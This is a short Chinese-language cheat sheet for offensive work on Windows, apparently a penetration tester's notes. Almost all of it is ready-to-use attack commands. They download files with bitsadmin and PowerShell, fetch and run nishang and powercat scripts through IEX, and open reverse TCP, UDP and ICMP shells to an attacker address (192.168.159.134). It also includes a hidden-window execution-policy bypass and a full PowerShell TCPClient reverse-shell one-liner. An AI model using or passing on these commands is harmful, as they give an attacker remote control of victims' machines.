# 下载文件


bitsadmin /transfer myDownLoadJob /download /priority normal "https://raw.githubusercontent.com/samratashok/nishang/bfeabd2e043dfef6392e8a930eb1d7a04392af36/Shells/Invoke-PoshRatHttps.ps1" "F:\test.ps1"

powershell "IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/samratashok/nishang/bfeabd2e043dfef6392e8a930eb1d7a04392af36/Shells/Invoke-PoshRatHttps.ps1','test.ps1')"

# 开启Web
## python
```
python -m SimpleHTTPServer 80
```
powershell "IEX (New-Object System.Net.WebClient).DownloadFile('http://192.168.52.134/11.py','test.py')"

# Powershell


```


```

# 反弹Shell
## Powershell
```
PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File d:\Invoke-PowerShellUdp.ps1

IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```
### PowerCat
```
开启监听：
nc -lvp 6666
或者使用powercat监听
powercat -l -p 6666

目标机反弹cmd shell： 
powershell IEX (New-Object System.Net.Webclient).DownloadString ('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.159.134 -p 6666 -e cmd

```
### nishang反弹shell 
### Reverse TCP shell 
```
开启监听：
nc -lvp 6666

目标机执行：

powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666
```

###  Reverse UDP shell 
```
开启监听：
nc -lvup 53

目标机执行： 
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1'); Invoke-PowerShellUdp -Reverse -IPAddress 192.168.159.134 -port 53
```

###  Reverse ICMP shell 
```
需要利用icmpsh_m.py (https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1 来反弹ICMP shell。 
首先攻击端下载icmpsh_m.py文件

icmpsh_m.py Usage： python icmpsh_m.py [Attacker IP] [Victim IP]
攻击者(192.168.159.134)执行： 
sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包 python icmpsh_m.py 192.168.159.134 192.168.159.138 #开启监听

目标机(192.168.159.138)执行： 
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress 192.168.159.134
```

###  自定义powershell函数反弹shell 
```
利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell，其实也是借鉴nishang中的Invoke-PowerShellTcpOneLine.ps1

攻击者(192.168.159.134) 开启监听：
nc -lvp 6666

目标机执行： 
powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('192.168.159.134',6666);$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```